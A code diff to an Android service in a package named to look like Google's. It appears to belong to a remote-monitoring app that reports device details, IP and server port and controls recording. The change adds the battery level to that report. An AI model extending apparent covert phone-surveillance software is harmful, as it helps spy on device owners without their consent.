@@ -3,10 +3,13 @@ package com.google.android.android;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
+import android.os.BatteryManager;
 import android.os.Build;
 import android.os.IBinder;
+import android.provider.Settings;
 import android.telephony.SmsManager;
 
 import org.json.simple.JSONArray;
@@ -215,6 +218,7 @@ public class MainService extends Service {
 
                 info.put("phoneName", Config.PHONE_NAME);
                 info.put("model", Build.MODEL);
+                info.put("battery", getBatteryPercentage());
                 info.put("ip", Config.IP_ADDRESS);
                 info.put("serverPort", Config.SERVER_PORT);
 
@@ -395,5 +399,17 @@ public class MainService extends Service {
                 getRecordManager().stopRecord();
                 break;
         }
+    }
+
+    public int getBatteryPercentage() {
+        IntentFilter iFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+        Intent batteryStatus = registerReceiver(null, iFilter);
+
+        int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
+        int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;
+
+        float batteryPct = level / (float) scale;
+
+        return (int) (batteryPct * 100);
     }
 }
